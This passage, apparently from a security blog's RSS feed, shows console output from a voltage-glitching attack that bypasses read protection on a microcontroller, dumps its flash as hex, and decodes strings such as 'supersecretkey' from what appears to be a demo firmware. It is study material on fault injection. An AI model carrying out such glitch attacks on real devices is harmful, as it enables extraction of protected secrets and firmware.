+</span></span><span style="display:flex;"><span>Result: 791fe0fb689b68b3f5805f07d0fb689b68002b0ad1fb681b69002b06d1fb681b685b68dab2fb691a7008e0fb681b685b68dbb203f07f03dab2fb691a70fb690133fb61fb68db8d9bb2013b9ab2fb68da85fb68db8d9bb2002bb2d1fb68202283f84220002300e0022318462037bd4680bd80b586b000aff860b9603b601346fb713be03b6ab3f1ff3f37d0fef797ff02463b68d31a3a6a9a4202d33b6a002b01d103233ae0fb681b68db6803f00403002b23d0bb68802b20d0bb68402b1dd0fb681b681b6803f00803082b16d100237b61fb681b681b687b61fb681b685b687b617b69f86800f01df8fb6808225a64fb68002283f8402001230fe0fb681b681a
+</span></span><span style="display:flex;"><span>Bytes to read: 791fe0fb689b68b3f5805f07d0fb689b68002b0ad1fb681b69002b06d1fb681b685b68dab2fb691a7008e0fb681b685b68dbb203f07f03dab2fb691a70fb690133fb61fb68db8d9bb2013b9ab2fb68da85fb68db8d9bb2002bb2d1fb68202283f84220002300e0022318462037bd4680bd80b586b000aff860b9603b601346fb713be03b6ab3f1ff3f37d0fef797ff02463b68d31a3a6a9a4202d33b6a002b01d103233ae0fb681b68db6803f00403002b23d0bb68802b20d0bb68402b1dd0fb681b681b6803f00803082b16d100237b61fb681b681b687b61fb681b685b687b617b69f86800f01df8fb6808225a64fb68002283f8402001230fe0fb681b681a
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18327</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134224896 08001c0014
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18321</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134224896 08001c0014
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18363</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134224896 08001c0014
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08001c0014
+</span></span><span style="display:flex;"><span>Result: 79bb681340ba689a420cbf01230023dbb21a46fb799a42b4d0002318461837bd4680bd80b495b000af78607b681b680c337b637b6b53e8003f3b633b6b23f49073fb647b681b680c33fa6c3a64fb63f96b3a6c41e80023bb63bb6b002be5d17b681b6814333b623b6a53e8003ffb61fb6923f00103bb647b681b681433ba6cfa62bb62b96afa6a41e800237b627b6a002be5d17b681b6b012b19d17b681b680c33fb60fb6853e8003fbb60bb6823f010037b647b681b680c337a6cba617b617969ba6941e800233b613b69002be5d17b68202283f842207b6800221a6300bf5437bd465df8047b70472de9b04fc0b000afc7f8f400d7f8f4301b681b6923f440
+</span></span><span style="display:flex;"><span>Bytes to read: 79bb681340ba689a420cbf01230023dbb21a46fb799a42b4d0002318461837bd4680bd80b495b000af78607b681b680c337b637b6b53e8003f3b633b6b23f49073fb647b681b680c33fa6c3a64fb63f96b3a6c41e80023bb63bb6b002be5d17b681b6814333b623b6a53e8003ffb61fb6923f00103bb647b681b681433ba6cfa62bb62b96afa6a41e800237b627b6a002be5d17b681b6b012b19d17b681b680c33fb60fb6853e8003fbb60bb6823f010037b647b681b680c337a6cba617b617969ba6941e800233b613b69002be5d17b68202283f842207b6800221a6300bf5437bd465df8047b70472de9b04fc0b000afc7f8f400d7f8f4301b681b6923f440
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;yy&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18324</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225152 08001d0015
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18313</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225152 08001d0015
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08001d0015
+</span></span><span style="display:flex;"><span>Result: 
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18308</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225152 08001d0015
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08001d0015
+</span></span><span style="display:flex;"><span>Result: 
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18362</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225152 08001d0015
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08001d0015
+</span></span><span style="display:flex;"><span>Result: 79d7f8f430d968d7f8f4301a6840ea01031361d7f8f4309a68d7f8f4301b691a43d7f8f4305b691a43d7f8f430db691343c7f8f830d7f8f4301b68db6823f4164121f00c01d7f8f4301a68d7f8f8300b43d360d7f8f4301b685b6923f44070d7f8f4309969d7f8f4301a6840ea01035361d7f8f4301a688f4b9a4205d0d7f8f4301a688d4b9a4204d1fff76cfdc7f8fc0003e0fff753fdc7f8fc00d7f8f430db69b3f5004f40f00c81d7f8fc300022c7f8e830c7f8ec20d7e93a4522462b469118b9655b41fb65d7e91623214612eb0108294643eb01094ff000024ff000034feac90343ea58734feac80290469946234618eb0303c7f8e0302b4649eb0303c7
+</span></span><span style="display:flex;"><span>Bytes to read: 79d7f8f430d968d7f8f4301a6840ea01031361d7f8f4309a68d7f8f4301b691a43d7f8f4305b691a43d7f8f430db691343c7f8f830d7f8f4301b68db6823f4164121f00c01d7f8f4301a68d7f8f8300b43d360d7f8f4301b685b6923f44070d7f8f4309969d7f8f4301a6840ea01035361d7f8f4301a688f4b9a4205d0d7f8f4301a688d4b9a4204d1fff76cfdc7f8fc0003e0fff753fdc7f8fc00d7f8f430db69b3f5004f40f00c81d7f8fc300022c7f8e830c7f8ec20d7e93a4522462b469118b9655b41fb65d7e91623214612eb0108294643eb01094ff000024ff000034feac90343ea58734feac80290469946234618eb0303c7f8e0302b4649eb0303c7
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18338</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225408 08001e0016
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08001e0016
+</span></span><span style="display:flex;"><span>Result: 
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18339</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225408 08001e0016
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08001e0016
+</span></span><span style="display:flex;"><span>Result: 79e430d7f8f4305b680022c7f8d830c7f8dc20d7e936120b46db183b65134642eb03037b65d7e91423d7e93801fef7e4f902460b46614ba3fb02235b091c01d7f8fc300022c7f8d030c7f8d420d7e9348942464b469118b9645b41fb64d7e91223414612eb010a494643eb010b4ff000024ff000034feacb0343ea5a734feaca0292469b4643461aeb0303c7f8c8304b464beb0303c7f8cc30d7f8f4305b680022c7f8c030c7f8c420d7e930120b46db183b64134642eb03037b64d7e91023d7e93201fef799f902460b4611463b4ba3fb01235b09642202fb03f3cb1adb0003f13202364ba3fb02235b095b0003f4f8731c44d7f8fc300022c7f8b830c7f8bc
+</span></span><span style="display:flex;"><span>Bytes to read: 79e430d7f8f4305b680022c7f8d830c7f8dc20d7e936120b46db183b65134642eb03037b65d7e91423d7e93801fef7e4f902460b46614ba3fb02235b091c01d7f8fc300022c7f8d030c7f8d420d7e9348942464b469118b9645b41fb64d7e91223414612eb010a494643eb010b4ff000024ff000034feacb0343ea5a734feaca0292469b4643461aeb0303c7f8c8304b464beb0303c7f8cc30d7f8f4305b680022c7f8c030c7f8c420d7e930120b46db183b64134642eb03037b64d7e91023d7e93201fef799f902460b4611463b4ba3fb01235b09642202fb03f3cb1adb0003f13202364ba3fb02235b095b0003f4f8731c44d7f8fc300022c7f8b830c7f8bc
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;yy&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18319</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225664 08001f0017
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18316</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225664 08001f0017
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08001f0017
+</span></span><span style="display:flex;"><span>Result: 79d7e92e8942464b469118b9635b41fb63d7e90e2341465118396349464b417b634ff000024ff00003d7e90cab5946cb00514643ea51735146ca0010461946034642469b18c7f8b0304b460a4642eb0303c7f8b430d7f8f4305b680022c7f8a830c7f8ac20d7e92a120b46db18bb62134642eb0303fb62d7e90a23d7e92c01fef73bf902460b460d4ba3fb02135b09642101fb03f3d31adb003233084aa2fb03235b0903f00702d7f8f4301b6822449a6006e100bf00100140001401401f85eb51d7f8fc300022c7f8a030c7f8a420d7e9288942464b46911839625b417b62d7e9082341465418494643eb01054ff000024ff00003eb0043ea5473e20014461d
+</span></span><span style="display:flex;"><span>Bytes to read: 79d7e92e8942464b469118b9635b41fb63d7e90e2341465118396349464b417b634ff000024ff00003d7e90cab5946cb00514643ea51735146ca0010461946034642469b18c7f8b0304b460a4642eb0303c7f8b430d7f8f4305b680022c7f8a830c7f8ac20d7e92a120b46db18bb62134642eb0303fb62d7e90a23d7e92c01fef73bf902460b460d4ba3fb02135b09642101fb03f3d31adb003233084aa2fb03235b0903f00702d7f8f4301b6822449a6006e100bf00100140001401401f85eb51d7f8fc300022c7f8a030c7f8a420d7e9288942464b46911839625b417b62d7e9082341465418494643eb01054ff000024ff00003eb0043ea5473e20014461d
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18365</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225920 <span style="color:#bd93f9">0800200028</span>
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18313</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225920 <span style="color:#bd93f9">0800200028</span>
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18313</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225920 <span style="color:#bd93f9">0800200028</span>
+</span></span><span style="display:flex;"><span>Result 1f1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18320</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134225920 <span style="color:#bd93f9">0800200028</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800200028</span>
+</span></span><span style="display:flex;"><span>Result: 794346e318c7f898304b4645eb0303c7f89c30d7f8f4305b680022c7f89030c7f894204ff000024ff00003d7e9244529468b00214643ea917321468a00d7e92601fef7daf802460b46604ba3fb02235b091c01d7f8fc300022c7f88830c7f88c20d7e9228942464b469118b9615b41fb61d7e9062341465118396149464b417b614ff000024ff00003d7e904ab5946cb00514643ea51735146ca0010461946034642469b18c7f880304b460a4642eb0303c7f88430d7f8f4305b680022bb67fa674ff000024ff00003d7e91e8949468b00414643ea917341468a00d7e92001fef78bf802460b461146384ba3fb01235b09642202fb03f3cb1a1b013233334aa2
+</span></span><span style="display:flex;"><span>Bytes to read: 794346e318c7f898304b4645eb0303c7f89c30d7f8f4305b680022c7f89030c7f894204ff000024ff00003d7e9244529468b00214643ea917321468a00d7e92601fef7daf802460b46604ba3fb02235b091c01d7f8fc300022c7f88830c7f88c20d7e9228942464b469118b9615b41fb61d7e9062341465118396149464b417b614ff000024ff00003d7e904ab5946cb00514643ea51735146ca0010461946034642469b18c7f880304b460a4642eb0303c7f88430d7f8f4305b680022bb67fa674ff000024ff00003d7e91e8949468b00414643ea917341468a00d7e92001fef78bf802460b461146384ba3fb01235b09642202fb03f3cb1a1b013233334aa2
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18332</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134226176 <span style="color:#bd93f9">0800210029</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800210029</span>
+</span></span><span style="display:flex;"><span>Result: 7903235b0903f0f0031c44d7f8fc3000223b677a67d7e91c8942464b469118b9605b41fb60d7e9022341465118396049464b417b604ff000024ff00003d7e900ab5946cb00514643ea51735146ca0010461946034642469b18bb664b460a4642eb0303fb66d7f8f4305b6800223b667a664ff000024ff00003d7e9188949468b00414643ea917341468a00d7e91a01fef733f802460b460d4ba3fb02135b09642101fb03f3d31a1b013233084aa2fb03235b0903f00f02d7f8f4301b6822449a6000bf07f58077bd46bde8b08f1f85eb5102440346934200d1704703f8011bf9e770b50d4d0d4c641ba4100026a64209d10b4d0c4c00f018f8641ba4100026a6
+</span></span><span style="display:flex;"><span>Bytes to read: 7903235b0903f0f0031c44d7f8fc3000223b677a67d7e91c8942464b469118b9605b41fb60d7e9022341465118396049464b417b604ff000024ff00003d7e900ab5946cb00514643ea51735146ca0010461946034642469b18bb664b460a4642eb0303fb66d7f8f4305b6800223b667a664ff000024ff00003d7e9188949468b00414643ea917341468a00d7e91a01fef733f802460b460d4ba3fb02135b09642101fb03f3d31a1b013233084aa2fb03235b0903f00f02d7f8f4301b6822449a6000bf07f58077bd46bde8b08f1f85eb5102440346934200d1704703f8011bf9e770b50d4d0d4c641ba4100026a64209d10b4d0c4c00f018f8641ba4100026a6
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18358</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134226432 080022002a
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080022002a
+</span></span><span style="display:flex;"><span>Result: 7905d170bd55f8043b98470136eee755f8043b98470136f2e7e0220008e0220008e0220008e4220008f8b500bff8bc08bc9e467047f8b500bff8bc08bc9e46704773757065727365637265746b6579000077726f6e6721210a00000000477565737320746865206b6579210a0050617373776f726420636f7272656374210a00004c6f636b6564210a00000000476c697463686564210a00006b3a2564200000006a3a256420000000693a25640a200000476c6974636820627970617373000000000000000000000001020304060708090000000001020304fcdeff7f01000000b90100089501000840220008502200085c2200086c2200080024f400100000
+</span></span><span style="display:flex;"><span>Bytes to read: 7905d170bd55f8043b98470136eee755f8043b98470136f2e7e0220008e0220008e0220008e4220008f8b500bff8bc08bc9e467047f8b500bff8bc08bc9e46704773757065727365637265746b6579000077726f6e6721210a00000000477565737320746865206b6579210a0050617373776f726420636f7272656374210a00004c6f636b6564210a00000000476c697463686564210a00006b3a2564200000006a3a256420000000693a25640a200000476c6974636820627970617373000000000000000000000001020304060708090000000001020304fcdeff7f01000000b90100089501000840220008502200085c2200086c2200080024f400100000
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y1\x00\x00y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18326</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134226688 080023002b
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18342</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134226688 080023002b
+</span></span></code></pre></div><p>Subsequently, the firmware can be read obtain all the secrets stored:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ echo -n 7905d170bd55f8043b98470136eee755f8043b98470136f2e7e0220008e0220008e0220008e4220008f8b500bff8bc08bc9e467047f8b500bff8bc08bc9e46704773757065727365637265746b6579000077726f6e6721210a00000000477565737320746865206b6579210a0050617373776f726420636f7272656374210a00004c6f636b6564210a00000000476c697463686564210a00006b3a2564200000006a3a256420000000693a25640a200000476c6974636820627970617373000000000000000000000001020304060708090000000001020304fcdeff7f01000000b90100089501000840220008502200085c2200086c2200080024f400100000 | xxd -r -p
+</span></span><span style="display:flex;"><span>y�p�U�;�G6��U�;�G6������������FpG������FpGsupersecretkeywrong!!
+</span></span><span style="display:flex;"><span>Guess the key!
+</span></span><span style="display:flex;"><span>Password correct!
+</span></span><span style="display:flex;"><span>Locked!
+</span></span><span style="display:flex;"><span>Glitched!
+</span></span><span style="display:flex;"><span>k:%d j:%d i:%d
+</span></span><span style="display:flex;"><span> Glitch bypass  ���@P\l$�%         
+</span></span><span style="display:flex;"><span>[...]
+</span></span></code></pre></div>]]></description>
+      
+    </item>
+    
+    
+  </channel>
+</rss>
